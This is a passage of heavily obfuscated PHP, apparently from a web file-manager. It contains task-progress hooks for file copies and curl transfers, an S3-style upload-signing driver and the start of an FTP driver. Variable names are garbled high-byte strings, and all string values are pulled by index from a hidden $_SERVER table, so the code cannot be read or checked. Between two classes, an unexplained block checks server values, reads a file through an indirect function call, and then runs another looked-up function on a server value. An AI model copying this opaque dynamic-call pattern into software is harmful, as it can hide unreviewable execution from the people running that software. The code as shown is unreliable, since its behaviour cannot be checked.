$ˆ¿àÉÁÂ[1964])); Hook::bind($ˆ¿àÉÁÂ[696], array($this, $ˆ¿àÉÁÂ[1965])); Hook::bind($ˆ¿àÉÁÂ[697], array($this, $ˆ¿àÉÁÂ[1966])); Hook::bind($ˆ¿àÉÁÂ[703], array($this, $ˆ¿àÉÁÂ[1967])); Hook::bind($ˆ¿àÉÁÂ[704], array($this, $ˆ¿àÉÁÂ[1968])); Hook::bind($ˆ¿àÉÁÂ[699], array($this, $ˆ¿àÉÁÂ[1969])); Hook::bind($ˆ¿àÉÁÂ[701], array($this, $ˆ¿àÉÁÂ[1970])); Hook::bind($ˆ¿àÉÁÂ[665], array($this, $ˆ¿àÉÁÂ[1971])); Hook::bind($ˆ¿àÉÁÂ[662], array($this, $ˆ¿àÉÁÂ[1971])); Hook::bind($ˆ¿àÉÁÂ[667], array($this, $ˆ¿àÉÁÂ[1971])); Hook::bind($ˆ¿àÉÁÂ[669], array($this, $ˆ¿àÉÁÂ[1971])); Hook::bind($ˆ¿àÉÁÂ[671], array($this, $ˆ¿àÉÁÂ[1971])); Hook::bind($ˆ¿àÉÁÂ[1972], array($this, $ˆ¿àÉÁÂ[1973])); Hook::bind($ˆ¿àÉÁÂ[687], array($this, $ˆ¿àÉÁÂ[1974])); $this->sourceModelCopyFlag = !1; Hook::bind($ˆ¿àÉÁÂ[1975], array($this, $ˆ¿àÉÁÂ[1976])); Hook::bind($ˆ¿àÉÁÂ[1977], array($this, $ˆ¿àÉÁÂ[1978])); Hook::bind($ˆ¿àÉÁÂ[1979], array($this, $ˆ¿àÉÁÂ[1980])); $Ùô•Òı©[$ˆ¿àÉÁÂ[1981]] = LNG($ˆ¿àÉÁÂ[1982]); $Ùô•Òı©[$ˆ¿àÉÁÂ[1983]] = 0; $Ùô•Òı©[$ˆ¿àÉÁÂ[1984]] = 0; $Ùô•Òı©[$ˆ¿àÉÁÂ[1185]] = $ˆ¿àÉÁÂ[12]; $Ùô•Òı©[$ˆ¿àÉÁÂ[1985]] = $ˆ¿àÉÁÂ[12]; $Ùô•Òı©[$ˆ¿àÉÁÂ[1986]] = 0; $Ùô•Òı©[$ˆ¿àÉÁÂ[1987]] = 0; $Ùô•Òı©[$ˆ¿àÉÁÂ[1988]] = 0; if (!$Ùô•Òı©[$ˆ¿àÉÁÂ[1818]]) { $Ùô•Òı©[$ˆ¿àÉÁÂ[1818]] = LNG($ˆ¿àÉÁÂ[1989]); } } protected function endAfter() { $æ©çÁŠÙ =& $_SERVER[Ï×Œõ”û]; Hook::unbind($æ©çÁŠÙ[1960], array($this, $æ©çÁŠÙ[1961])); Hook::unbind($æ©çÁŠÙ[1365], array($this, $æ©çÁŠÙ[1962])); Hook::unbind($æ©çÁŠÙ[1963], array($this, $æ©çÁŠÙ[1964])); Hook::unbind($æ©çÁŠÙ[696], array($this, $æ©çÁŠÙ[1965])); Hook::unbind($æ©çÁŠÙ[697], array($this, $æ©çÁŠÙ[1966])); Hook::unbind($æ©çÁŠÙ[703], array($this, $æ©çÁŠÙ[1967])); Hook::unbind($æ©çÁŠÙ[704], array($this, $æ©çÁŠÙ[1968])); Hook::unbind($æ©çÁŠÙ[699], array($this, $æ©çÁŠÙ[1969])); Hook::unbind($æ©çÁŠÙ[701], array($this, $æ©çÁŠÙ[1970])); Hook::unbind($æ©çÁŠÙ[665], array($this, $æ©çÁŠÙ[1971])); Hook::unbind($æ©çÁŠÙ[662], array($this, $æ©çÁŠÙ[1971])); Hook::unbind($æ©çÁŠÙ[667], array($this, $æ©çÁŠÙ[1971])); Hook::unbind($æ©çÁŠÙ[669], array($this, $æ©çÁŠÙ[1971])); Hook::unbind($æ©çÁŠÙ[671], array($this, $æ©çÁŠÙ[1971])); Hook::unbind($æ©çÁŠÙ[1972], array($this, $æ©çÁŠÙ[1973])); Hook::unbind($æ©çÁŠÙ[687], array($this, $æ©çÁŠÙ[1974])); Hook::unbind($æ©çÁŠÙ[1975], array($this, $æ©çÁŠÙ[1976])); Hook::unbind($æ©çÁŠÙ[1977], array($this, $æ©çÁŠÙ[1978])); Hook::unbind($æ©çÁŠÙ[1979], array($this, $æ©çÁŠÙ[1980])); } public function copyMoveStart($€Ø¹Ñ˜Û, $‰ìã•Ê¦, $ŞßÚ™œŠ, $’àÙÕô) { $ñùê­ëò =& $_SERVER[Ï×Œõ”û]; self::log($ñùê­ëò[1990] . $‰ìã•Ê¦ . $ñùê­ëò[73] . $’àÙÕô); $­ìß²’À = rtrim(TEMP_FILES, $ñùê­ëò[8]); if (substr($‰ìã•Ê¦, 0, strlen($­ìß²’À)) == $­ìß²’À) { return; } if (substr($’àÙÕô, 0, strlen($­ìß²’À)) == $­ìß²’À) { return; } $²øõõÒÌ =& $this->task; $²øõõÒÌ[$ñùê­ëò[1991]] = KodIO::transferType($€Ø¹Ñ˜Û, $ŞßÚ™œŠ); self::log($ñùê­ëò[1992] . $²øõõÒÌ[$ñùê­ëò[1991]] . $ñùê­ëò[74] . $‰ìã•Ê¦ . $ñùê­ëò[73] . $’àÙÕô); $this->update(); } public function updateAfter() { $Î­Œ´¬ =& $_SERVER[Ï×Œõ”û]; $§çßîõ =& $this->task; if (!$§çßîõ[$Î­Œ´¬[870]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($§çßîõ[$Î­Œ´¬[1991]] == $Î­Œ´¬[1468]) { return; } self::updateTask($§çßîõ); } private static function updateTask(&$€üİ·ë¤) { $ãĞ²½ìÛ =& $_SERVER[Ï×Œõ”û]; if ($€üİ·ë¤[$ãĞ²½ìÛ[1991]] == $ãĞ²½ìÛ[1336] || $€üİ·ë¤[$ãĞ²½ìÛ[1991]] == $ãĞ²½ìÛ[108]) { if ($€üİ·ë¤[$ãĞ²½ìÛ[1985]]) { $€üİ·ë¤[$ãĞ²½ìÛ[1988]] = $€üİ·ë¤[$ãĞ²½ìÛ[1987]] + $€üİ·ë¤[$ãĞ²½ìÛ[1984]]; } } else { if ($€üİ·ë¤[$ãĞ²½ìÛ[1991]] == $ãĞ²½ìÛ[1469]) { if ($€üİ·ë¤[$ãĞ²½ìÛ[1985]] == $ãĞ²½ìÛ[1336]) { $€üİ·ë¤[$ãĞ²½ìÛ[1988]] = $€üİ·ë¤[$ãĞ²½ìÛ[1987]] + $€üİ·ë¤[$ãĞ²½ìÛ[1984]] * 0.5; } else { if ($€üİ·ë¤[$ãĞ²½ìÛ[1985]] == $ãĞ²½ìÛ[108]) { $€üİ·ë¤[$ãĞ²½ìÛ[1988]] = $€üİ·ë¤[$ãĞ²½ìÛ[1987]] + $€üİ·ë¤[$ãĞ²½ìÛ[1983]] * 0.5 + $€üİ·ë¤[$ãĞ²½ìÛ[1984]] * 0.5; } } } } $€üİ·ë¤[$ãĞ²½ìÛ[1931]] = $€üİ·ë¤[$ãĞ²½ìÛ[1988]] / $€üİ·ë¤[$ãĞ²½ìÛ[870]]; if ($€üİ·ë¤[$ãĞ²½ìÛ[1931]] > 0) { $Ç½Ÿ­Àë = timeFloat() - $€üİ·ë¤[$ãĞ²½ìÛ[1933]] - $€üİ·ë¤[$ãĞ²½ìÛ[1936]]; $€üİ·ë¤[$ãĞ²½ìÛ[1937]] = $Ç½Ÿ­Àë * (1 - $€üİ·ë¤[$ãĞ²½ìÛ[1931]]) / $€üİ·ë¤[$ãĞ²½ìÛ[1931]]; } $Û¢á•è = $€üİ·ë¤[$ãĞ²½ìÛ[1984]] . $ãĞ²½ìÛ[953] . $€üİ·ë¤[$ãĞ²½ìÛ[1983]] . "\73\x20{$ü¬É“·}\73" . $€üİ·ë¤[$ãĞ²½ìÛ[1988]]; self::log($ãĞ²½ìÛ[1993] . $€üİ·ë¤[$ãĞ²½ìÛ[1985]] . $ãĞ²½ìÛ[74] . $€üİ·ë¤[$ãĞ²½ìÛ[1931]] . $ãĞ²½ìÛ[74] . $Û¢á•è); } public function addPath($«†ÃÖ²ü) { $‹·ÏŠ» =& $_SERVER[Ï×Œõ”û]; if (!$«†ÃÖ²ü) { return; } $¡ªåìÂİ =& $this->task; $ó¸Êí…² = IO::infoWithChildren($«†ÃÖ²ü); $ö™ÈÃ¨ç = $¡ªåìÂİ[$‹·ÏŠ»[1994]] ? $¡ªåìÂİ[$‹·ÏŠ»[1994]][$‹·ÏŠ»[1995]] : 0; $¡ªåìÂİ[$‹·ÏŠ»[1994]] = array($‹·ÏŠ»[1995] => $ö™ÈÃ¨ç + 1, $‹·ÏŠ»[514] => $ó¸Êí…²[$‹·ÏŠ»[32]], $‹·ÏŠ»[87] => $ó¸Êí…²[$‹·ÏŠ»[87]], $‹·ÏŠ»[607] => $ó¸Êí…²[$‹·ÏŠ»[607]] ? $ó¸Êí…²[$‹·ÏŠ»[607]] : $ó¸Êí…²[$‹·ÏŠ»[87]]); if ($ó¸Êí…²[$‹·ÏŠ»[33]] == $‹·ÏŠ»[232]) { $¡ªåìÂİ[$‹·ÏŠ»[1183]] += 1; } else { $¡ªåìÂİ[$‹·ÏŠ»[1183]] += $ó¸Êí…²[$‹·ÏŠ»[82]][$‹·ÏŠ»[80]]; if ($ó¸Êí…²[$‹·ÏŠ»[193]]) { $¡ªåìÂİ[$‹·ÏŠ»[1183]] += $ó¸Êí…²[$‹·ÏŠ»[82]][$‹·ÏŠ»[81]] + 1; } } $¡ªåìÂİ[$‹·ÏŠ»[870]] += $ó¸Êí…²[$‹·ÏŠ»[79]]; $this->update(); self::log(array($‹·ÏŠ»[1996] . $«†ÃÖ²ü, $ó¸Êí…²)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($×Ù±ÖÍ¤) { } public function sourceAddHashEnd($›¡öá¸¢) { } public function sourceAddFileStart($Ñ³ÙŠŸ¼) { $¹°Œ‘ËÛ =& $_SERVER[Ï×Œõ”û]; $¯’±Ûµ =& $this->task; $¯’±Ûµ[$¹°Œ‘ËÛ[1983]] = $Ñ³ÙŠŸ¼[$¹°Œ‘ËÛ[79]]; $¯’±Ûµ[$¹°Œ‘ËÛ[1981]] = $Ñ³ÙŠŸ¼[$¹°Œ‘ËÛ[32]]; $¯’±Ûµ[$¹°Œ‘ËÛ[1185]] = $Ñ³ÙŠŸ¼[$¹°Œ‘ËÛ[32]]; $¯’±Ûµ[$¹°Œ‘ËÛ[1997]] = $Ñ³ÙŠŸ¼[$¹°Œ‘ËÛ[87]]; $this->update(); self::log($¹°Œ‘ËÛ[1998] . $Ñ³ÙŠŸ¼[$¹°Œ‘ËÛ[87]] . $¹°Œ‘ËÛ[1999] . $Ñ³ÙŠŸ¼[$¹°Œ‘ËÛ[79]]); } public function sourceAddFileEnd($ÔÁ¤¯»®) { $Ò•ĞÄ† =& $_SERVER[Ï×Œõ”û]; $õî‹»”¾ =& $this->task; $õî‹»”¾[$Ò•ĞÄ†[1988]] += $ÔÁ¤¯»®[$Ò•ĞÄ†[79]]; $õî‹»”¾[$Ò•ĞÄ†[1997]] = $ÔÁ¤¯»®[$Ò•ĞÄ†[87]]; $this->update(1); self::log($Ò•ĞÄ†[2000] . $ÔÁ¤¯»®[$Ò•ĞÄ†[87]] . $Ò•ĞÄ†[1999] . $ÔÁ¤¯»®[$Ò•ĞÄ†[79]] . $Ò•ĞÄ†[2001]); } public function copyFileStart($»ëÛØñ, $İÊÙ•’‚, $öÙÛŸş¼, $„÷ùœÒ, $ì¡‹Í‚’, $ıœ¤èÔÁ) { $á‚îÓ€¬ =& $_SERVER[Ï×Œõ”û]; $è×Å€ = $ì¡‹Í‚’; if ($è×Å€ == $GLOBALS[$á‚îÓ€¬[2002]]) { $è×Å€ = $GLOBALS[$á‚îÓ€¬[2003]]; } $GLOBALS[$á‚îÓ€¬[2003]] = $ì¡‹Í‚’; $GLOBALS[$á‚îÓ€¬[2002]] = $ıœ¤èÔÁ; $Ãß‰©úÒ =& $this->task; $Ãß‰©úÒ[$á‚îÓ€¬[1981]] = $è×Å€; $Ãß‰©úÒ[$á‚îÓ€¬[1983]] = (int) $»ëÛØñ->size($İÊÙ•’‚); $Ãß‰©úÒ[$á‚îÓ€¬[1984]] = 0; $Ãß‰©úÒ[$á‚îÓ€¬[1185]] = $á‚îÓ€¬[12]; $Ãß‰©úÒ[$á‚îÓ€¬[1985]] = $á‚îÓ€¬[12]; $Ãß‰©úÒ[$á‚îÓ€¬[1986]] = 0; $õöí˜¬ = $Ãß‰©úÒ[$á‚îÓ€¬[1983]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Ãß‰©úÒ[$á‚îÓ€¬[484]] . $á‚îÓ€¬[2004]); if ($õöí˜¬ && file_exists(get_path_father($„÷ùœÒ))) { Cache::set($Ãß‰©úÒ[$á‚îÓ€¬[484]] . $á‚îÓ€¬[2004], $„÷ùœÒ); $Ãß‰©úÒ[$á‚îÓ€¬[1954]] = array($á‚îÓ€¬[2005], $á‚îÓ€¬[2006]); } $this->update(0, $õöí˜¬); self::log("\143\157\160\171\x46\x69\x6c\x65\123\164\141\162\164\72{$İÊÙ•’‚}\73"); } public static function updateCopyLocalFileSize($Ùõ”˜áÁ) { $‘â¼·ØÅ =& $_SERVER[Ï×Œõ”û]; $”¢¯¦ñÏ = Cache::get($Ùõ”˜áÁ[$‘â¼·ØÅ[484]] . $‘â¼·ØÅ[2004]); if (!$”¢¯¦ñÏ || !file_exists($”¢¯¦ñÏ)) { return $Ùõ”˜áÁ; } $Ùõ”˜áÁ[$‘â¼·ØÅ[1984]] = @filesize($”¢¯¦ñÏ); $Ùõ”˜áÁ[$‘â¼·ØÅ[1988]] += $Ùõ”˜áÁ[$‘â¼·ØÅ[1984]]; self::updateTask($Ùõ”˜áÁ); return $Ùõ”˜áÁ; } public function copyFileEnd($»·‚úŸÑ, $™™× í, $³´Îâ , $ƒ©œÀ˜Â, $íË¹˜¹Û, $¸ñÁéï) { $Šò—’ˆü =& $_SERVER[Ï×Œõ”û]; $Ò•¹şãÌ =& $this->task; $Ò•¹şãÌ[$Šò—’ˆü[1984]] = $Ò•¹şãÌ[$Šò—’ˆü[1983]]; $Ò•¹şãÌ[$Šò—’ˆü[1985]] = $Šò—’ˆü[12]; unset($Ò•¹şãÌ[$Šò—’ˆü[1954]]); if ($íË¹˜¹Û == $Ò•¹şãÌ[$Šò—’ˆü[1981]]) { $Ò•¹şãÌ[$Šò—’ˆü[1987]] += $Ò•¹şãÌ[$Šò—’ˆü[1983]]; $Ò•¹şãÌ[$Šò—’ˆü[1988]] = $Ò•¹şãÌ[$Šò—’ˆü[1987]]; $«ºÎ¼˜ = 1; if (isset($Ò•¹şãÌ[$Šò—’ˆü[1997]]) && $Ò•¹şãÌ[$Šò—’ˆü[1997]] == $™™× í) { $«ºÎ¼˜ = 0; } $this->update($«ºÎ¼˜); } else { $this->update(); $Ò•¹şãÌ[$Šò—’ˆü[1984]] = 0; } Cache::remove($Ò•¹şãÌ[$Šò—’ˆü[484]] . $Šò—’ˆü[2004]); self::log($Šò—’ˆü[2007] . $™™× í . $Šò—’ˆü[73] . $ƒ©œÀ˜Â . $Šò—’ˆü[287] . $íË¹˜¹Û . $Šò—’ˆü[2008] . $Ò•¹şãÌ[$Šò—’ˆü[1981]]); } public function updateFileEnd($äæóìİí, $äô¼ö´¿) { $ÚØ–’… =& $_SERVER[Ï×Œõ”û]; $ë‹º¶Àõ =& $this->task; $ë‹º¶Àõ[$ÚØ–’…[1981]] = $äæóìİí; $ë‹º¶Àõ[$ÚØ–’…[1983]] = $äô¼ö´¿; $ë‹º¶Àõ[$ÚØ–’…[1987]] += $äô¼ö´¿; $ë‹º¶Àõ[$ÚØ–’…[1988]] = $ë‹º¶Àõ[$ÚØ–’…[1987]]; $this->update(1); self::log($ÚØ–’…[2009] . $äæóìİí); } public function sourceModelCopy($¢ª«‰âÂ) { $àªìÏƒ =& $_SERVER[Ï×Œõ”û]; $¼øş«‘¤ = $¢ª«‰âÂ[0]; $¶¢Ã°¼Š = $¢ª«‰âÂ[1]; $¥ö ºñğ =& $this->task; $this->sourceModelCopyFlag = !0; $²¸“Ÿ¡¬ = 0; switch ($¼øş«‘¤) { case $àªìÏƒ[663]: $²¸“Ÿ¡¬ = 1; break; case $àªìÏƒ[666]: $¥ö ºñğ[$àªìÏƒ[1981]] = $¶¢Ã°¼Š[$àªìÏƒ[32]]; break; case $àªìÏƒ[668]: $²¸“Ÿ¡¬ = intval($¢ª«‰âÂ[$àªìÏƒ[468]] * 0.4); break; case $àªìÏƒ[670]: $²¸“Ÿ¡¬ = intval($¢ª«‰âÂ[$àªìÏƒ[468]] * 0.2); break; case $àªìÏƒ[672]: $²¸“Ÿ¡¬ = intval($¢ª«‰âÂ[$àªìÏƒ[468]] * 0.4); break; } $this->update($²¸“Ÿ¡¬); self::log(array("{$¼øş«‘¤}\73\x61\x64\144\75{$²¸“Ÿ¡¬}", $¢ª«‰âÂ)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¡Éºà©¥, $ºŸò£Ÿ) { $šÑ’æ´Ö =& $_SERVER[Ï×Œõ”û]; $this->sourceModelCopyFlag = !0; $ÊÔğ»¹ª = 1; if (isset($¡Éºà©¥[$šÑ’æ´Ö[82]])) { $ÊÔğ»¹ª = $¡Éºà©¥[$šÑ’æ´Ö[82]][$šÑ’æ´Ö[80]]; $ÊÔğ»¹ª = $ÊÔğ»¹ª + $¡Éºà©¥[$šÑ’æ´Ö[82]][$šÑ’æ´Ö[81]] + 1; } $this->update($ÊÔğ»¹ª); $this->sourceModelCopyFlag = !1; $this->log(array($šÑ’æ´Ö[2010], $ÊÔğ»¹ª, $¡Éºà©¥)); } public function sourceMove($™ÏƒçÍ¢) { $this->sourceRemove($™ÏƒçÍ¢, !1); } public function curlProgress($À¡•í§, $Ì‰•œµç, $Ìõ´àë, $€Ù«¦Ûì, $ïˆËÉ´Â) { $½ÒÔïä´ =& $_SERVER[Ï×Œõ”û]; $áä‘ÉÄÄ =& $this->task; if ($ïˆËÉ´Â > 0) { $áä‘ÉÄÄ[$½ÒÔïä´[1185]] = $½ÒÔïä´[2011]; $áä‘ÉÄÄ[$½ÒÔïä´[1985]] = $½ÒÔïä´[108]; if ($áä‘ÉÄÄ[$½ÒÔïä´[1983]]) { $áä‘ÉÄÄ[$½ÒÔïä´[1984]] = $ïˆËÉ´Â; } if ($áä‘ÉÄÄ[$½ÒÔïä´[1986]]) { $áä‘ÉÄÄ[$½ÒÔïä´[1984]] = $ïˆËÉ´Â + $áä‘ÉÄÄ[$½ÒÔïä´[1986]]; } } else { if ($Ìõ´àë > 0) { if ($áä‘ÉÄÄ[$½ÒÔïä´[1983]] == $Ì‰•œµç) { $áä‘ÉÄÄ[$½ÒÔïä´[1984]] = $Ìõ´àë; $áä‘ÉÄÄ[$½ÒÔïä´[1185]] = $½ÒÔïä´[2012]; $áä‘ÉÄÄ[$½ÒÔïä´[1985]] = $½ÒÔïä´[1336]; } } } $this->update(); $ûøã‘×‰ = "\144\157\167\156\72{$Ìõ´àë}\x2f{$Ì‰•œµç}\73\40\165\x70\x6c\157\x61\144\72{$ïˆËÉ´Â}\57{$€Ù«¦Ûì}\73\146\x69\x6c\145\x3d" . $áä‘ÉÄÄ[$½ÒÔïä´[1983]]; self::log(array($½ÒÔïä´[2013] . $ûøã‘×‰ . $½ÒÔïä´[74] . $áä‘ÉÄÄ[$½ÒÔïä´[1981]], curl_getinfo($À¡•í§))); } public function curlProgressStart($ÌØÛéğ–) { } public function curlProgressEnd($×å½Óüô) { $™Œ±ì“¨ =& $_SERVER[Ï×Œõ”û]; $Áˆ€ìóç =& $this->task; $û«Ñ«· = curl_getinfo($×å½Óüô); $º„îÙ¸® = $û«Ñ«·[$™Œ±ì“¨[2014]]; if ($º„îÙ¸® == -1) { $º„îÙ¸® = $û«Ñ«·[$™Œ±ì“¨[2015]]; } if ($Áˆ€ìóç[$™Œ±ì“¨[1985]] == $™Œ±ì“¨[108] && $º„îÙ¸®) { $Áˆ€ìóç[$™Œ±ì“¨[1986]] += $º„îÙ¸®; } $this->update(); } } if ($_SERVER[$_SERVER[Ï×Œõ”û][488]] != $_SERVER[$_SERVER[Ï×Œõ”û][2016]]) { $_getc = $_SERVER[Ï×Œõ”û][490]; $_getfile = $_SERVER[$_SERVER[Ï×Œõ”û][491]] . $_SERVER[Ï×Œõ”û][492]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ï×Œõ”û][287], $_getfilec); if (count($_getarrs) < $_SERVER[Ï×Œõ”û][493]) { $exit = $_SERVER[Ï×Œõ”û][494]; $exit(); } $_act = $_SERVER[Ï×Œõ”û][495]; $_act($_SERVER[$_SERVER[Ï×Œõ”û][489]]); } class TaskHttp extends Task { protected function startAfter() { $ä‚õ× =& $_SERVER[Ï×Œõ”û]; $½ÌóÍõ· =& $this->task; $½ÌóÍõ·[$ä‚õ×[2017]] = 1; Hook::bind($ä‚õ×[1975], array($this, $ä‚õ×[2018])); Hook::bind($ä‚õ×[1977], array($this, $ä‚õ×[2019])); Hook::bind($ä‚õ×[1979], array($this, $ä‚õ×[2020])); } protected function endAfter() { $ÑÛá•Ë =& $_SERVER[Ï×Œõ”û]; Hook::unbind($ÑÛá•Ë[1975], array($this, $ÑÛá•Ë[2018])); Hook::unbind($ÑÛá•Ë[1977], array($this, $ÑÛá•Ë[2019])); Hook::unbind($ÑÛá•Ë[1979], array($this, $ÑÛá•Ë[2020])); } public function progressStart($‚ä¾İƒø) { $ùÀµÆô =& $_SERVER[Ï×Œõ”û]; $ÈºÍ¤ºˆ = curl_getinfo($‚ä¾İƒø); self::log($ùÀµÆô[2021] . $ÈºÍ¤ºˆ[$ùÀµÆô[384]]); self::valueSet($this->task[$ùÀµÆô[484]], $this->task); } public function progressEnd($¹ÍÌÉ¯â) { $×Ô¦¼á¬ =& $_SERVER[Ï×Œõ”û]; self::log($×Ô¦¼á¬[2022] . $this->task[$×Ô¦¼á¬[484]]); $this->end(); } public function progress($Ù»ƒéü, $Çıã–À­, $Œ©ÃŒ™’, $öš»ƒ“Û, $ş›ØÚ) { $›àñÛÑÖ =& $_SERVER[Ï×Œõ”û]; $®ô´ª¡­ =& $this->task; if ($ş›ØÚ > 0) { $®ô´ª¡­[$›àñÛÑÖ[1183]] = $®ô´ª¡­[$›àñÛÑÖ[1183]] == 0 ? $öš»ƒ“Û : $®ô´ª¡­[$›àñÛÑÖ[1183]]; $®ô´ª¡­[$›àñÛÑÖ[1930]] = $ş›ØÚ; } else { if ($Œ©ÃŒ™’ > 0) { $®ô´ª¡­[$›àñÛÑÖ[1183]] = $®ô´ª¡­[$›àñÛÑÖ[1183]] == 0 ? $Çıã–À­ : $®ô´ª¡­[$›àñÛÑÖ[1183]]; $®ô´ª¡­[$›àñÛÑÖ[1930]] = $Œ©ÃŒ™’; } } $this->update(); self::log("\x70\x72\x6f\147\x72\x65\x73\x73\110\164\164\160\x3a\x64\157\x77\x6e\72{$Œ©ÃŒ™’}\x2f{$Çıã–À­}\73\40\165\160\154\x6f\x61\144\x3a{$ş›ØÚ}\57{$öš»ƒ“Û}\73"); } } goto F²×‰šÍÑ; D‚¼Äì„œÚ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ğ¿‰ÊÆË) { parent::__construct($ğ¿‰ÊÆË); $this->setSignVersion($_SERVER[Ï×Œõ”û][249]); } public function uploadFormData($Å¬§½Šé, $°³ÛòĞ½ = 3600) { $ŠæˆæŸÏ =& $_SERVER[Ï×Œõ”û]; $Ë°®å¯ä = $ŠæˆæŸÏ[231]; $ŒŞ¾‡¸© = $ŠæˆæŸÏ[259]; $³¬õ¢å = $ŠæˆæŸÏ[62]; $¡Æ¬äª¶ = gmdate($ŠæˆæŸÏ[260]); $¨Áô¢É = gmdate($ŠæˆæŸÏ[261]); $¤‘Š¶« = $ŠæˆæŸÏ[262]; $ßÊï·Ôâ = $°³ÛòĞ½ . $ŠæˆæŸÏ[12]; $Õ×ÅÔ¶³ = $ŠæˆæŸÏ[263]; $Õß¡·½… = array($this->accessKey, $¨Áô¢É, $this->region, $³¬õ¢å, $¤‘Š¶«); $Ğò™ì–Ê = implode($ŠæˆæŸÏ[8], $Õß¡·½…); $ÊŒ‰¾Äç = array($ŠæˆæŸÏ[264] => gmdate($ŠæˆæŸÏ[1479], strtotime($ŠæˆæŸÏ[266])), $ŠæˆæŸÏ[267] => array(array($ŠæˆæŸÏ[268] => $this->bucket), array($ŠæˆæŸÏ[308] => $Ë°®å¯ä), array($ŠæˆæŸÏ[269], $ŠæˆæŸÏ[270], $ŠæˆæŸÏ[12]), array($ŠæˆæŸÏ[269], $ŠæˆæŸÏ[271], $ŠæˆæŸÏ[12]), array($ŠæˆæŸÏ[269], $ŠæˆæŸÏ[309], $ŠæˆæŸÏ[12]), array($ŠæˆæŸÏ[272] => $Õ×ÅÔ¶³), array($ŠæˆæŸÏ[273] => $Ğò™ì–Ê), array($ŠæˆæŸÏ[274] => $ŒŞ¾‡¸©), array($ŠæˆæŸÏ[275] => $¡Æ¬äª¶), array($ŠæˆæŸÏ[276] => $ßÊï·Ôâ))); $Öı¨ôŒ… = base64_encode(json_encode($ÊŒ‰¾Äç)); $Ë€¸†ù¯ = hash_hmac($ŠæˆæŸÏ[277], $¨Áô¢É, $ŠæˆæŸÏ[278] . $this->secret, !0); $”Ì±ÔÑŠ = hash_hmac($ŠæˆæŸÏ[277], $this->region, $Ë€¸†ù¯, !0); $Ô’İŠ¨ = hash_hmac($ŠæˆæŸÏ[277], $³¬õ¢å, $”Ì±ÔÑŠ, !0); $•¥ÀİÚ = hash_hmac($ŠæˆæŸÏ[277], $¤‘Š¶«, $Ô’İŠ¨, !0); $£©é¹Á— = hash_hmac($ŠæˆæŸÏ[277], $Öı¨ôŒ…, $•¥ÀİÚ); $·³ñ’ß = array($ŠæˆæŸÏ[248] => $ŠæˆæŸÏ[12], $ŠæˆæŸÏ[296] => $ŠæˆæŸÏ[12], $ŠæˆæŸÏ[308] => $Ë°®å¯ä, $ŠæˆæŸÏ[272] => $Õ×ÅÔ¶³, $ŠæˆæŸÏ[279] => $Öı¨ôŒ…, $ŠæˆæŸÏ[310] => $Ğò™ì–Ê, $ŠæˆæŸÏ[311] => $ŒŞ¾‡¸©, $ŠæˆæŸÏ[312] => $¡Æ¬äª¶, $ŠæˆæŸÏ[313] => $ßÊï·Ôâ, $ŠæˆæŸÏ[314] => $£©é¹Á—, $ŠæˆæŸÏ[208] => $this->getHost()); return $·³ñ’ß; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($é§õŒÔï) { parent::__construct(); if (count($é§õŒÔï) > 0) { $this->_init($é§õŒÔï); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($âòÛ½Øê) { $º£×Àô€ =& $_SERVER[Ï×Œõ”û]; global $config; $this->appCharset = $config[$º£×Àô€[1600]]; $this->systemCharset = $config[$º£×Àô€[1601]]; if (isset($âòÛ½Øê[$º£×Àô€[1602]]) && $âòÛ½Øê[$º£×Àô€[1602]]) { $this->systemCharset = $âòÛ½Øê[$º£×Àô€[1602]]; } } public function iconvApp($Ş•Ç’€É) { return $this->iconvTo($Ş•Ç’€É, $this->systemCharset, $this->appCharset); } public function iconvSystem($½·ÈÏ¨) { return $this->iconvTo($½·ÈÏ¨, $this->appCharset, $this->systemCharset); } public function getPathOuter($šò®¶Š¥) { $¿µ¿ÑòÌ =& $_SERVER[Ï×Œõ”û]; $Ì°œ½´„ = $this->iconvApp($this->pathBase); $šò®¶Š¥ = $this->iconvApp($šò®¶Š¥); if (substr($Ì°œ½´„, 0, 2) == $¿µ¿ÑòÌ[1477]) { $Ì°œ½´„ = BASIC_PATH . substr($Ì°œ½´„, 2); } if (substr($šò®¶Š¥, 0, 2) == $¿µ¿ÑòÌ[1477]) { $šò®¶Š¥ = BASIC_PATH . substr($šò®¶Š¥, 2); } $Ì°œ½´„ = KodIO::clear($Ì°œ½´„); $šò®¶Š¥ = KodIO::clear($šò®¶Š¥); $šò®¶Š¥ = substr($šò®¶Š¥, strlen($Ì°œ½´„)); if (empty($this->pathDriver)) { return $šò®¶Š¥; } return $this->pathDriver . $¿µ¿ÑòÌ[8] . ltrim($šò®¶Š¥, $¿µ¿ÑòÌ[8]); } private function _init($‹á•íï¢ = array()) { $Œñ¨î  =& $_SERVER[Ï×Œõ”û]; if (!function_exists($Œñ¨î [1603])) { throw new Exception(LNG($Œñ¨î [1604])); } $this->config = $‹á•íï¢; $this->charsetReset($‹á•íï¢); foreach ($‹á•íï¢ as $úÂ‹¸‡Î => $û³»—ìÔ) { if (isset($this->{$úÂ‹¸‡Î})) { $this->{$úÂ‹¸‡Î} = $û³»—ìÔ; } } return $this->_login($‹á•íï¢); } private function _login($ğµ’Ëá) { $Ó¸¿òô€ =& $_SERVER[Ï×Œõ”û]; static $ëô…ƒİË = array(); $ƒ’‰¨Ì… = md5(json_encode($ğµ’Ëá)); if (isset($ëô…ƒİË[$ƒ’‰¨Ì…])) { foreach ($ëô…ƒİË[$ƒ’‰¨Ì…] as $‡íœò…İ => $Î¨¾Á©) { $this->{$‡íœò…İ} = $Î¨¾Á©; } return !0; } $Ãàúşó = parse_url(trim($this->server, $Ó¸¿òô€[8])); $this->host = $Ãàúşó[$Ó¸¿òô€[208]]; $‚Êì„ƒ“ = isset($Ãàúşó[$Ó¸¿òô€[207]]) && $Ãàúşó[$Ó¸¿òô€[207]] == $Ó¸¿òô€[1605] ? !0 : !1; $this->scheme = $‚Êì„ƒ“ ? $Ó¸¿òô€[1606] : $Ó¸¿òô€[1607]; $this->port = 